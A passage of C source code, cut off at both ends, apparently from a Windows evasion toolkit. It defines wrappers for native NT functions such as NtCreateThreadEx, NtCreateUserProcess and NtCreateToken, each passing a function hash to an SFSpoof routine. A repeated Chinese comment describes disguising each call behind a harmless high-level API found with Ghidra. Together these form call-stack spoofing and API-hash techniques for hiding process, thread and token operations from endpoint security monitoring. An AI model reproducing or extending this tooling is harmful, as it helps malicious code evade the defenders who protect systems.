NTSTATUS SFNtCreateKeyedEvent(PHANDLE KeyedEventHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, ULONG Flags) {
    Params.param[1] = (DWORD_PTR)KeyedEventHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)Flags;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x0F915D941;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateLowBoxToken(PHANDLE TokenHandle, HANDLE ExistingTokenHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PSID PackageSid, ULONG CapabilityCount, PSID_AND_ATTRIBUTES Capabilities, ULONG HandleCount, HANDLE Handles) {
    Params.param[1] = (DWORD_PTR)TokenHandle;
    Params.param[2] = (DWORD_PTR)ExistingTokenHandle;
    Params.param[3] = (DWORD_PTR)DesiredAccess;
    Params.param[4] = (DWORD_PTR)ObjectAttributes;
    Params.param[5] = (DWORD_PTR)PackageSid;
    Params.param[6] = (DWORD_PTR)CapabilityCount;
    Params.param[7] = (DWORD_PTR)Capabilities;
    Params.param[8] = (DWORD_PTR)HandleCount;
    Params.param[9] = (DWORD_PTR)Handles;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 9;
    Params.FuncHash = 0x011A63F1A;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateMailslotFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, ULONG CreateOptions, ULONG MailslotQuota, ULONG MaximumMessageSize, PLARGE_INTEGER ReadTimeout) {
    Params.param[1] = (DWORD_PTR)FileHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)IoStatusBlock;
    Params.param[5] = (DWORD_PTR)CreateOptions;
    Params.param[6] = (DWORD_PTR)MailslotQuota;
    Params.param[7] = (DWORD_PTR)MaximumMessageSize;
    Params.param[8] = (DWORD_PTR)ReadTimeout;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 8;
    Params.FuncHash = 0x02AA0FA96;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateMutant(PHANDLE MutantHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, BOOLEAN InitialOwner) {
    Params.param[1] = (DWORD_PTR)MutantHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)InitialOwner;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x0CC4FE9D6;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateNamedPipeFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, BOOLEAN NamedPipeType, BOOLEAN ReadMode, BOOLEAN CompletionMode, ULONG MaximumInstances, ULONG InboundQuota, ULONG OutboundQuota, PLARGE_INTEGER DefaultTimeout) {
    Params.param[1] = (DWORD_PTR)FileHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)IoStatusBlock;
    Params.param[5] = (DWORD_PTR)ShareAccess;
    Params.param[6] = (DWORD_PTR)CreateDisposition;
    Params.param[7] = (DWORD_PTR)CreateOptions;
    Params.param[8] = (DWORD_PTR)NamedPipeType;
    Params.param[9] = (DWORD_PTR)ReadMode;
    Params.param[10] = (DWORD_PTR)CompletionMode;
    Params.param[11] = (DWORD_PTR)MaximumInstances;
    Params.param[12] = (DWORD_PTR)InboundQuota;
    Params.param[13] = (DWORD_PTR)OutboundQuota;
    Params.param[14] = (DWORD_PTR)DefaultTimeout;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 14;
    Params.FuncHash = 0x0A09B76A6;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreatePagingFile(PUNICODE_STRING PageFileName, PULARGE_INTEGER MinimumSize, PULARGE_INTEGER MaximumSize, ULONG Priority) {
    Params.param[1] = (DWORD_PTR)PageFileName;
    Params.param[2] = (DWORD_PTR)MinimumSize;
    Params.param[3] = (DWORD_PTR)MaximumSize;
    Params.param[4] = (DWORD_PTR)Priority;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x0E37AD32F;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreatePartition(PHANDLE PartitionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, ULONG PreferredNode) {
    Params.param[1] = (DWORD_PTR)PartitionHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)PreferredNode;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x0C775E424;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreatePort(PHANDLE PortHandle, POBJECT_ATTRIBUTES ObjectAttributes, ULONG MaxConnectionInfoLength, ULONG MaxMessageLength, ULONG MaxPoolUsage) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = (DWORD_PTR)ObjectAttributes;
    Params.param[3] = (DWORD_PTR)MaxConnectionInfoLength;
    Params.param[4] = (DWORD_PTR)MaxMessageLength;
    Params.param[5] = (DWORD_PTR)MaxPoolUsage;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x062F37D70;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreatePrivateNamespace(PHANDLE NamespaceHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PVOID BoundaryDescriptor) {
    Params.param[1] = (DWORD_PTR)NamespaceHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)BoundaryDescriptor;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x00AADCFF5;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ParentProcess, BOOLEAN InheritObjectTable, HANDLE SectionHandle, HANDLE DebugPort, HANDLE ExceptionPort) {
    Params.param[1] = (DWORD_PTR)ProcessHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)ParentProcess;
    Params.param[5] = (DWORD_PTR)InheritObjectTable;
    Params.param[6] = (DWORD_PTR)SectionHandle;
    Params.param[7] = (DWORD_PTR)DebugPort;
    Params.param[8] = (DWORD_PTR)ExceptionPort;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 8;
    Params.FuncHash = 0x013BE36E6;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateProfile(PHANDLE ProfileHandle, HANDLE Process, PVOID ProfileBase, ULONG ProfileSize, ULONG BucketSize, PULONG Buffer, ULONG BufferSize, KPROFILE_SOURCE ProfileSource, ULONG Affinity) {
    Params.param[1] = (DWORD_PTR)ProfileHandle;
    Params.param[2] = (DWORD_PTR)Process;
    Params.param[3] = (DWORD_PTR)ProfileBase;
    Params.param[4] = (DWORD_PTR)ProfileSize;
    Params.param[5] = (DWORD_PTR)BucketSize;
    Params.param[6] = (DWORD_PTR)Buffer;
    Params.param[7] = (DWORD_PTR)BufferSize;
    Params.param[8] = (DWORD_PTR)ProfileSource;
    Params.param[9] = (DWORD_PTR)Affinity;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 9;
    Params.FuncHash = 0x068BF2068;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateProfileEx(PHANDLE ProfileHandle, HANDLE Process, PVOID ProfileBase, SIZE_T ProfileSize, ULONG BucketSize, PULONG Buffer, ULONG BufferSize, KPROFILE_SOURCE ProfileSource, USHORT GroupCount, PGROUP_AFFINITY GroupAffinity) {
    Params.param[1] = (DWORD_PTR)ProfileHandle;
    Params.param[2] = (DWORD_PTR)Process;
    Params.param[3] = (DWORD_PTR)ProfileBase;
    Params.param[4] = (DWORD_PTR)ProfileSize;
    Params.param[5] = (DWORD_PTR)BucketSize;
    Params.param[6] = (DWORD_PTR)Buffer;
    Params.param[7] = (DWORD_PTR)BufferSize;
    Params.param[8] = (DWORD_PTR)ProfileSource;
    Params.param[9] = (DWORD_PTR)GroupCount;
    Params.param[10] = (DWORD_PTR)GroupAffinity;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 10;
    Params.FuncHash = 0x08CD67FAC;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateRegistryTransaction(PHANDLE Handle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, DWORD Flags) {
    Params.param[1] = (DWORD_PTR)Handle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)Flags;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x008E6364F;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateResourceManager(PHANDLE ResourceManagerHandle, ACCESS_MASK DesiredAccess, HANDLE TmHandle, LPGUID RmGuid, POBJECT_ATTRIBUTES ObjectAttributes, ULONG CreateOptions, PUNICODE_STRING Description) {
    Params.param[1] = (DWORD_PTR)ResourceManagerHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)TmHandle;
    Params.param[4] = (DWORD_PTR)RmGuid;
    Params.param[5] = (DWORD_PTR)ObjectAttributes;
    Params.param[6] = (DWORD_PTR)CreateOptions;
    Params.param[7] = (DWORD_PTR)Description;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 7;
    Params.FuncHash = 0x0B837ECED;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateSemaphore(PHANDLE SemaphoreHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, LONG InitialCount, LONG MaximumCount) {
    Params.param[1] = (DWORD_PTR)SemaphoreHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)InitialCount;
    Params.param[5] = (DWORD_PTR)MaximumCount;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x0C99991A6;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateSymbolicLinkObject(PHANDLE LinkHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PUNICODE_STRING LinkTarget) {
    Params.param[1] = (DWORD_PTR)LinkHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)LinkTarget;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x0A437DCDB;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PPS_ATTRIBUTE_LIST AttributeList) {
    Params.param[1] = (DWORD_PTR)ThreadHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)ProcessHandle;
    Params.param[5] = (DWORD_PTR)StartRoutine;
    Params.param[6] = (DWORD_PTR)Argument;
    Params.param[7] = (DWORD_PTR)CreateFlags;
    Params.param[8] = (DWORD_PTR)ZeroBits;
    Params.param[9] = (DWORD_PTR)StackSize;
    Params.param[10] = (DWORD_PTR)MaximumStackSize;
    Params.param[11] = (DWORD_PTR)AttributeList;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 11;
    Params.FuncHash = 0x05CB293F5;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateTimer(PHANDLE TimerHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, TIMER_TYPE TimerType) {
    Params.param[1] = (DWORD_PTR)TimerHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)TimerType;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x0DB8FD712;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateTimer2(PHANDLE TimerHandle, PVOID Reserved1, PVOID Reserved2, ULONG Attributes, ACCESS_MASK DesiredAccess) {
    Params.param[1] = (DWORD_PTR)TimerHandle;
    Params.param[2] = (DWORD_PTR)Reserved1;
    Params.param[3] = (DWORD_PTR)Reserved2;
    Params.param[4] = (DWORD_PTR)Attributes;
    Params.param[5] = (DWORD_PTR)DesiredAccess;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x0C9542EC1;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateToken(PHANDLE TokenHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, TOKEN_TYPE TokenType, PLUID AuthenticationId, PLARGE_INTEGER ExpirationTime, PTOKEN_USER User, PTOKEN_GROUPS Groups, PTOKEN_PRIVILEGES Privileges, PTOKEN_OWNER Owner, PTOKEN_PRIMARY_GROUP PrimaryGroup, PTOKEN_DEFAULT_DACL DefaultDacl, PTOKEN_SOURCE TokenSource) {
    Params.param[1] = (DWORD_PTR)TokenHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)TokenType;
    Params.param[5] = (DWORD_PTR)AuthenticationId;
    Params.param[6] = (DWORD_PTR)ExpirationTime;
    Params.param[7] = (DWORD_PTR)User;
    Params.param[8] = (DWORD_PTR)Groups;
    Params.param[9] = (DWORD_PTR)Privileges;
    Params.param[10] = (DWORD_PTR)Owner;
    Params.param[11] = (DWORD_PTR)PrimaryGroup;
    Params.param[12] = (DWORD_PTR)DefaultDacl;
    Params.param[13] = (DWORD_PTR)TokenSource;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 13;
    Params.FuncHash = 0x0D590EBD8;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateTokenEx(PHANDLE TokenHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, TOKEN_TYPE TokenType, PLUID AuthenticationId, PLARGE_INTEGER ExpirationTime, PTOKEN_USER User, PTOKEN_GROUPS Groups, PTOKEN_PRIVILEGES Privileges, PTOKEN_SECURITY_ATTRIBUTES_INFORMATION UserAttributes, PTOKEN_SECURITY_ATTRIBUTES_INFORMATION DeviceAttributes, PTOKEN_GROUPS DeviceGroups, PTOKEN_MANDATORY_POLICY TokenMandatoryPolicy, PTOKEN_OWNER Owner, PTOKEN_PRIMARY_GROUP PrimaryGroup, PTOKEN_DEFAULT_DACL DefaultDacl, PTOKEN_SOURCE TokenSource) {
    Params.param[1] = (DWORD_PTR)TokenHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)TokenType;
    Params.param[5] = (DWORD_PTR)AuthenticationId;
    Params.param[6] = (DWORD_PTR)ExpirationTime;
    Params.param[7] = (DWORD_PTR)User;
    Params.param[8] = (DWORD_PTR)Groups;
    Params.param[9] = (DWORD_PTR)Privileges;
    Params.param[10] = (DWORD_PTR)UserAttributes;
    Params.param[11] = (DWORD_PTR)DeviceAttributes;
    Params.param[12] = (DWORD_PTR)DeviceGroups;
    Params.param[13] = (DWORD_PTR)TokenMandatoryPolicy;
    Params.param[14] = (DWORD_PTR)Owner;
    Params.param[15] = (DWORD_PTR)PrimaryGroup;
    Params.param[16] = (DWORD_PTR)DefaultDacl;
    Params.param[17] = (DWORD_PTR)TokenSource;
    Params.ParamNum = 17;
    Params.FuncHash = 0x0AE4A7814;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateTransaction(PHANDLE TransactionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, LPGUID Uow, HANDLE TmHandle, ULONG CreateOptions, ULONG IsolationLevel, ULONG IsolationFlags, PLARGE_INTEGER Timeout, PUNICODE_STRING Description) {
    Params.param[1] = (DWORD_PTR)TransactionHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)Uow;
    Params.param[5] = (DWORD_PTR)TmHandle;
    Params.param[6] = (DWORD_PTR)CreateOptions;
    Params.param[7] = (DWORD_PTR)IsolationLevel;
    Params.param[8] = (DWORD_PTR)IsolationFlags;
    Params.param[9] = (DWORD_PTR)Timeout;
    Params.param[10] = (DWORD_PTR)Description;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 10;
    Params.FuncHash = 0x02C6B3CE9;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateTransactionManager(PHANDLE TmHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PUNICODE_STRING LogFileName, ULONG CreateOptions, ULONG CommitStrength) {
    Params.param[1] = (DWORD_PTR)TmHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)LogFileName;
    Params.param[5] = (DWORD_PTR)CreateOptions;
    Params.param[6] = (DWORD_PTR)CommitStrength;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x08FB0DF6F;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateUserProcess(PHANDLE ProcessHandle, PHANDLE ThreadHandle, ACCESS_MASK ProcessDesiredAccess, ACCESS_MASK ThreadDesiredAccess, POBJECT_ATTRIBUTES ProcessObjectAttributes, POBJECT_ATTRIBUTES ThreadObjectAttributes, ULONG ProcessFlags, ULONG ThreadFlags, PVOID ProcessParameters, PPS_CREATE_INFO CreateInfo, PPS_ATTRIBUTE_LIST AttributeList) {
    Params.param[1] = (DWORD_PTR)ProcessHandle;
    Params.param[2] = (DWORD_PTR)ThreadHandle;
    Params.param[3] = (DWORD_PTR)ProcessDesiredAccess;
    Params.param[4] = (DWORD_PTR)ThreadDesiredAccess;
    Params.param[5] = (DWORD_PTR)ProcessObjectAttributes;
    Params.param[6] = (DWORD_PTR)ThreadObjectAttributes;
    Params.param[7] = (DWORD_PTR)ProcessFlags;
    Params.param[8] = (DWORD_PTR)ThreadFlags;
    Params.param[9] = (DWORD_PTR)ProcessParameters;
    Params.param[10] = (DWORD_PTR)CreateInfo;
    Params.param[11] = (DWORD_PTR)AttributeList;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 11;
    Params.FuncHash = 0x0821E8193;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateWaitCompletionPacket(PHANDLE WaitCompletionPacketHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes) {
    Params.param[1] = (DWORD_PTR)WaitCompletionPacketHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x039A0416C;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateWaitablePort(PHANDLE PortHandle, POBJECT_ATTRIBUTES ObjectAttributes, ULONG MaxConnectionInfoLength, ULONG MaxMessageLength, ULONG MaxPoolUsage) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = (DWORD_PTR)ObjectAttributes;
    Params.param[3] = (DWORD_PTR)MaxConnectionInfoLength;
    Params.param[4] = (DWORD_PTR)MaxMessageLength;
    Params.param[5] = (DWORD_PTR)MaxPoolUsage;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x0608C6716;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateWnfStateName(PCWNF_STATE_NAME StateName, WNF_STATE_NAME_LIFETIME NameLifetime, WNF_DATA_SCOPE DataScope, BOOLEAN PersistData, PCWNF_TYPE_ID TypeId, ULONG MaximumStateSize, PSECURITY_DESCRIPTOR SecurityDescriptor) {
